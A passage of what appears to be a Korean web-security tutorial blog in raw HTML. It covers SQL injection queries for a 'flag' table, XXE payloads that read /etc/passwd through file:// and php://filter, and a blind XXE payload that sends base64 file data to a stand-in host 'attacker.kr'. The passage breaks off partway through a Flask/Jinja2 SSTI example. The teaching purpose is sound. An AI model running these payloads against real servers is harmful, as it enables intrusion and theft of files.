<span class=\"token keyword\">AND</span> table_name <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">;</span>\n\nadmin flag <span class=\"token constant\">BASE</span> TABLEInnoDB <span class=\"token number\">10</span>\n\nselect table_name<span class=\"token punctuation\">,</span>column_name from information_schema<span class=\"token operator\">.</span>columns where table_schema <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'admin'</span> <span class=\"token keyword\">and</span> table_name <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">use</span> <span class=\"token package\">admin</span><span class=\"token punctuation\">;</span>select <span class=\"token operator\">*</span> from flag<span class=\"token punctuation\">;</span></code></pre></div>\n<hr>\n<h1 id=\"xxe-xml-external-entity-injection-overview\" style=\"position:relative;\"><a href=\"#xxe-xml-external-entity-injection-overview\" aria-label=\"xxe xml external entity injection overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XXE (XML External Entity Injection) Overview</h1>\n<ul>\n<li>대상 애플리케이션 환경에서 XML 데이터를 처리할 시 공격자가 악의적인 요소를 삽입하여 서버의 데이터를 보거나 SSRF와 함께 이용할 수 있는 취약점 입니다.</li>\n<li>XXS는 웹에서만 발생하는 취약점이 아닌, pptx, xlsx, docx 등 OOXML을 사용하는 곳에서 도 발생합니다.</li>\n</ul>\n<p><strong>XML?</strong></p>\n<ul>\n<li>eXtensible Markup Language: 확장성 있는 마크업 언어</li>\n<li>W3C가 정보를 쉽게 교환하기 위해 만든 데이터 교환 포맷</li>\n<li>다음과 같이 <code class=\"language-text\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></code> 로 시작해서 사용자가 마음대로 태그를 정의해서 사용합니다.</li>\n<li>특정 데이터를 저장할 때 다음과 같이 포맷을 만들어서 저장하고 해당 내용을 불러올 때는 프로그램에 내장된 XML Parser를 이용합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<h1 id=\"xml-external-entity-injection-취약점\" style=\"position:relative;\"><a href=\"#xml-external-entity-injection-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"xml external entity injection 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XML External Entity Injection 취약점</h1>\n<ul>\n<li>서버상에 저장된 XML 데이터를 불러올 때 XML Parser에서 외부 엔티티를 사용한다는 구문이 있다면 XML Parser가 해당 내용을 일고 데이터를 처리합니다.</li>\n<li>만약에 일반적인 XML 데이터를 처리하는 프로그램이 있다고 하였을 때 외부 엔티티를 사용할 수있도록 코드를 주입하며 XXE 공격이 발생합니다.</li>\n<li>선언된 외부 요소를 사용하고 싶다면 <code class=\"language-text\">&amp;변수명</code> 과 같은 형식으로 사용합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">replace</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">xxe</span> <span class=\"token attr-name\">\"Uee\"</span><span class=\"token punctuation\">></span></span></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>위 코드 인젝션을 수행하였을 경우 응답 데이터를 정상과 비교해보록 하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\">정상 결과\nEmail : kevin@nasa.goc\nFirstName : Kevin\nLastName :\n\nXXE 공격 수행 결과\nEmail : kevin@nasa.goc\nFirstName : Kevin\nLastName : Uee</code></pre></div>\n<ul>\n<li>XXE 공격 수행 결과 “Uee” 라는 글자가 Response에 출력이 되었다면 파급력이 높은 XXE 공격이 성공할 가능성이 높아집니다.</li>\n</ul>\n<h3 id=\"그렇다면-xxe를-활용하여-무엇을-할-수-있까요\" style=\"position:relative;\"><a href=\"#%EA%B7%B8%EB%A0%87%EB%8B%A4%EB%A9%B4-xxe%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-%EB%AC%B4%EC%97%87%EC%9D%84-%ED%95%A0-%EC%88%98-%EC%9E%88%EA%B9%8C%EC%9A%94\" aria-label=\"그렇다면 xxe를 활용하여 무엇을 할 수 있까요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>그렇다면 XXE를 활용하여 무엇을 할 수 있까요?</h3>\n<ul>\n<li>파일 읽기 (file://, php://)</li>\n<li>SSRF (Port Scan, HTTP GET 접속,…)</li>\n<li>DOS (메모리 고갈 ⇒ &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, &#x26;xee, …)</li>\n<li>Remote Code Execution (jar:// , XXE+SSRF(gopher://))</li>\n<li>…</li>\n</ul>\n<h3 id=\"xxe-파일-읽기\" style=\"position:relative;\"><a href=\"#xxe-%ED%8C%8C%EC%9D%BC-%EC%9D%BD%EA%B8%B0\" aria-label=\"xxe 파일 읽기 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>XXE 파일 읽기</h3>\n<ul>\n<li>file:// 프로토콜을 활용하여 서버내 파일을 읽어올 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">foo</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY xxe SYSTEM \"file://etc/passwd\"></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>다음과 같이 서버에서 직접 접근해서 파일을 읽어오는 과정에서 인코딩 중 <code class=\"language-text\">&lt;, ></code> 문자가 포함되어 있는 경우 인코딩 에러가 발생할 수 있기 때문에 <code class=\"language-text\">base64</code> 인코딩을 과정을 거치는 과정을 수행합니다.</li>\n<li>php:// php wrapper 를 활용하여 base64로 응답 데이터를 인코딩을 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">foo</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\"></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<h3 id=\"bind-xxe-attack\" style=\"position:relative;\"><a href=\"#bind-xxe-attack\" aria-label=\"bind xxe attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bind XXE Attack</h3>\n<ul>\n<li>XXE 공격이 가능한 벡터가 존재하지만 서버에서 응답을 받을 수 없는 경우 활용 방안 입니다.</li>\n<li>다음은 외부 서버에 페이로드를 구성합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\">payload.xml\n\n&lt;!ENTITY % eval \"&lt;!ENTITY exfil SYSTEM 'http://attacker.kr/data?=%data;'>\"> %eval;</code></pre></div>\n<ul>\n<li>다음은 대상 애플리케이션 에 공격할 페이로드 입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">foo</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n&lt;!ENTITY % oob SYSTEM \"http://attacker.kr/payload.xml\"> % oob;</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>userInfo</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>email</span><span class=\"token punctuation\">></span></span>kevin@nasa.gov<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>email</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>firstName</span><span class=\"token punctuation\">></span></span>Kevin<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>firstName</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>lastName</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&exfil;\">&amp;exfil;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>lastName</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>userInfo</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li>해당 페이로드가 동작을 하면서 공격자 서버 access_log에 base64로 인코딩 된정보를 확인할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"xml\"><pre class=\"language-xml\"><code class=\"language-xml\">GET /data?bidF3123232oij== HTTP/1.0</code></pre></div>\n<hr>\n<h1 id=\"ssti-server-side-template-injection-overview\" style=\"position:relative;\"><a href=\"#ssti-server-side-template-injection-overview\" aria-label=\"ssti server side template injection overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSTI Server Side Template Injection Overview</h1>\n<ul>\n<li>웹 애플리케이션에 동적인 내용을 HTML로 출력할 때 미리 정의한 Template에 동적인 값을 넣어서 출력하는 Template engine을 이용합니다.</li>\n<li>대부분의 Template Engine 에서 <code class=\"language-text\">{{2*3}}</code>, <code class=\"language-text\">${2*3}</code> 과 같은 문법을 지원합니다.</li>\n<li>만약에 Template 내부에서 사용되는 Context가 아닌 Template Source에서 사용자 입력이 들어가게된다면 악의적인 입력을 통해 개발자가 의도하지 않은 임의의 Template 기능을 실행할 수 있게 됩니다.</li>\n<li>사용자의 입력 데이터가 Template에 직접 사용될 경우 Template Engine이 해석하여 실행하는 문법을 사용할 수 있기 때문에 SSTI가 발생합니다</li>\n</ul>\n<h1 id=\"server-side-template-injection-취약점\" style=\"position:relative;\"><a href=\"#server-side-template-injection-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"server side template injection 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Server Side Template Injection 취약점</h1>\n<h3 id=\"server-side-template-injection-example\" style=\"position:relative;\"><a href=\"#server-side-template-injection-example\" aria-label=\"server side template injection example permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Server Side Template Injection Example</h3>\n<ul>\n<li>Python Flask의 경우 Jinja2 Template Engine을 사용하며 아래와 같이 <code class=\"language-text\">render_template_string</code> API를 통해 해당 템플린 코드가 해석되어 클라이언트에 렌더링되어집니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">root</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tuser <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'user'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> user<span class=\"token punctuation\">:</span>\n\t\tuser <span class=\"token operator\">=</span> <span class=\"token string\">'guest'</span>\n\tt_plate <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''&lt;h1>So Good! %s'''</span><span class=\"token operator\">%</span>user\n\t<span class=\"token keyword\">return</span> render_template_string<span class=\"token punctuation\">(</span>t_plate<span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>jinja2 템플릿 문법은 다음과 같이 사용이 되며 <code class=\"language-text\">{{code}}</code> code는 Python 문법으로 사용하시면 됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> Code <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> <span class=\"token number\">7</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span>Rendering<span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token number\">49</span></code></pre></div>\n<ul>\n<li>내부 적으로 Python이 처리되면서 <code class=\"language-text\">built_in function</code>이 동작이 수행됩니다.</li>\n<li>다음 <code class=\"language-text\">config</code> 는 애플리케이션 설정이 담긴 변수이며 출력하게 될시 서버의 다양한 정보를 확인할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>config<span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span> <span class=\"token comment\"># 애플리케이션 설정 값이 담긴 변수 </span>\n\n<span class=\"token operator\">=</span> Rendering <span class=\"token operator\">=</span>\n <span class=\"token operator\">&lt;</span>Config <span class=\"token punctuation\">{</span><span class=\"token string\">'JSON_AS_ASCII'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'USE_X_SENDFILE'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_SECURE'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_PATH'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_DOMAIN'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_NAME'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'session'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'MAX_COOKIE_SIZE'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">4093</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_SAMESITE'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'PROPAGATE_EXCEPTIONS'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'ENV'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'production'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'DEBUG'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'EXPLAIN_TEMPLATE_LOADING'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'MAX_CONTENT_LENGTH'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'APPLICATION_ROOT'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SERVER_NAME'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'PREFERRED_URL_SCHEME'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'http'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'JSONIFY_PRETTYPRINT_REGULAR'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'TESTING'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'PERMANENT_SESSION_LIFETIME'</span><span class=\"token punctuation\">:</span> datetime<span class=\"token punctuation\">.</span>timedelta<span class=\"token punctuation\">(</span><span class=\"token number\">31</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'TEMPLATES_AUTO_RELOAD'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'TRAP_BAD_REQUEST_ERRORS'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'JSON_SORT_KEYS'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'JSONIFY_MIMETYPE'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'application/json'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SESSION_COOKIE_HTTPONLY'</span><span class=\"token punctuation\">:</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'SEND_FILE_MAX_AGE_DEFAULT'</span><span class=\"token punctuation\">:</span> datetime<span class=\"token punctuation\">.</span>timedelta<span class=\"token 